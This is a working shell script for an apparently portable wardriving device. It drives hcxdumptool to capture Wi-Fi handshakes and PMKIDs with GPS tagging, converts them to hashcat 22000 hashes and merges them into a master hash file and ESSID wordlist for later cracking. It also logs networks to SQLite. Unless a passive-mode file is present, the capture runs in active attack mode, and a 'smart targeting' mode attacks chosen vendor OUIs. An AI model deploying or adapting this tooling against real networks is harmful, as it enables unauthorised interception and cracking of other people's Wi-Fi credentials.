#!/bin/sh

# ===== SIGNAL TRAP FOR CLEAN SHUTDOWN =====
cleanup() {
    echo "[!] Caught signal - cleaning up..."
    kill -15 $(jobs -p) 2>/dev/null
    rm -f /var/run/wardriving_core.pid
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

# Start virtual GPS server if it doesn't exist
killall socat 2>/dev/null
socat pty,link=/tmp/vGPS,raw,echo=0 tcp-listen:2947,reuseaddr,fork &

# Función para parpadear un LED si existe (feedback visual)
blink_led() {
    # Intenta encontrar un LED que probablemente sea seguro usar
    local LED=$(ls /sys/class/leds/ 2>/dev/null | grep -iE "usb" | head -n 1); [ -z "$LED" ] && LED=$(ls /sys/class/leds/ 2>/dev/null | grep -iE "wps|wlan|wifi|system|power" | head -n 1)
    if [ -n "$LED" ] && [ -f "/sys/class/leds/$LED/brightness" ]; then
        local current=$(cat /sys/class/leds/$LED/brightness)
        echo 0 > /sys/class/leds/$LED/brightness
        sleep 0.1
        echo 255 > /sys/class/leds/$LED/brightness 2>/dev/null || echo 1 > /sys/class/leds/$LED/brightness
        sleep 0.1
        echo $current > /sys/class/leds/$LED/brightness
    fi
}

while true; do

    if ! mount | grep -q "/mnt/wardriving"; then
        echo "ERROR: USB NOT DETECTED"
        exit 1
    fi
    
    USB_PCT=$(df /mnt/wardriving | awk 'NR==2 {print $5}' | tr -d '%')
    if [ "$USB_PCT" -ge 95 ]; then
        echo "ERROR: USB CAPACITY CRITICAL ($USB_PCT%). STOPPING CAPTURE." >> /tmp/wardriving_status.log
        blink_led
        sleep 5
        continue
    fi


    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    FILENAME="/mnt/wardriving/wardriving_${TIMESTAMP}.pcapng"
    NMEAFILE="/mnt/wardriving/wardriving_${TIMESTAMP}.nmea"
    HC2200FILE="/mnt/wardriving/wardriving_${TIMESTAMP}.hc2200"
    TMP_ESSID="/tmp/essid_${TIMESTAMP}.txt"
    
    echo "[*] Starting session: $FILENAME"
        OPTS=""
    if [ -f /etc/wardriving_mode.txt ]; then
        MODE=$(cat /etc/wardriving_mode.txt)
        if [ "$MODE" = "passive" ]; then
            OPTS="--silent"
            echo "[*] MODE: PASSIVE (Silent Site Survey)"
        elif [ "$MODE" = "smart" ]; then
            if [ -s /etc/wardriving_targets.txt ]; then
                # format targets for hcxdumptool: 112233
                cat /etc/wardriving_targets.txt | sed 's/://g' > /tmp/smart_targets.txt
                OPTS="--filterlist_ap=/tmp/smart_targets.txt --filtermode=2"
                echo "[*] MODE: SMART TARGETING (Attacking only targeted OUIs)"
            else
                echo "[*] MODE: SMART TARGETING (No targets defined, defaulting to PASSIVE)"
                OPTS="--silent"
            fi
        fi
    fi

    hcxdumptool -i wlan0mon -w "$FILENAME" --nmea_dev=/tmp/vGPS --nmea_pcapng --nmea_out="$NMEAFILE" -F -t 3 --tot=5 $OPTS
    
    if [ -f "$FILENAME" ]; then
        echo "[*] Converting $FILENAME to $HC2200FILE"
        hcxpcapngtool -o "$HC2200FILE" -E "$TMP_ESSID" --csv="/tmp/csv_${TIMESTAMP}.txt" "$FILENAME" > /dev/null 2>&1
        
        # SQLite Integration
        if command -v sqlite3 >/dev/null 2>&1 && [ -s "/tmp/csv_${TIMESTAMP}.txt" ]; then
            sqlite3 /mnt/wardriving/wardriving.db "CREATE TABLE IF NOT EXISTS networks (mac TEXT PRIMARY KEY, ssid TEXT, enc TEXT, channel INTEGER, lat REAL, lon REAL, first_seen DATETIME, last_seen DATETIME, rssi INTEGER);"
            sqlite3 /mnt/wardriving/wardriving.db "PRAGMA journal_mode=WAL; CREATE INDEX IF NOT EXISTS idx_last_seen ON networks(last_seen);" > /dev/null 2>&1
            
            awk -F'\t' '{
                mac=$2; ssid=$3; enc=$4; chan=$8; rssi=$9; gpsd=$11
                gsub(/\047/, "\047\047", ssid)
                lat="NULL"; lon="NULL"
                split(gpsd, g, " ")
                if(g[1] != "") lat=g[1]; if(g[2] != "") lon=g[2]
                printf "INSERT INTO networks (mac, ssid, enc, channel, lat, lon, first_seen, last_seen, rssi) VALUES (\047%s\047, \047%s\047, \047%s\047, %d, %s, %s, \047%s\047, \047%s\047, %d) ON CONFLICT(mac) DO UPDATE SET last_seen=\047%s\047, rssi=EXCLUDED.rssi;\n", mac, ssid, enc, chan, lat, lon, $1, $1, rssi, $1
            }' "/tmp/csv_${TIMESTAMP}.txt" > "/tmp/sql_${TIMESTAMP}.sql"
            
            sqlite3 /mnt/wardriving/wardriving.db < "/tmp/sql_${TIMESTAMP}.sql"
            rm -f "/tmp/csv_${TIMESTAMP}.txt" "/tmp/sql_${TIMESTAMP}.sql"
        fi

        
        # Si la conversión generó un hash
        if [ -s "$HC2200FILE" ]; then
            blink_led
            # Fusionar hashes para sincronización
            cat "$HC2200FILE" >> /mnt/wardriving/master.hc2200
            sort -u /mnt/wardriving/master.hc2200 -o /mnt/wardriving/master.hc2200
        fi
        
        # Limpiar el hc2200 individual (si estaba vacio se borra, si tenia hashes ya estan en el master)
        rm -f "$HC2200FILE"
        
        # Guardar diccionario de ESSID descubiertos
        if [ -s "$TMP_ESSID" ]; then
            cat "$TMP_ESSID" >> /mnt/wardriving/master_essid.txt
            sort -u /mnt/wardriving/master_essid.txt -o /mnt/wardriving/master_essid.txt
            rm -f "$TMP_ESSID"
        fi
        
        # Retencion configurable del pcapng
        if [ ! -f /etc/wardriving_keep_pcap.txt ]; then
            rm -f "$FILENAME"
        fi
    fi

    # Truncate log only when it grows excessively (avoid unnecessary I/O)
    LOG_SIZE=$(wc -l < /tmp/wardriving_status.log 2>/dev/null || echo 0)
    if [ "$LOG_SIZE" -gt 3000 ]; then
        tail -n 2000 /tmp/wardriving_status.log > /tmp/wardriving_status.tmp 2>/dev/null && mv /tmp/wardriving_status.tmp /tmp/wardriving_status.log
    fi

    sync
    sleep 2
done
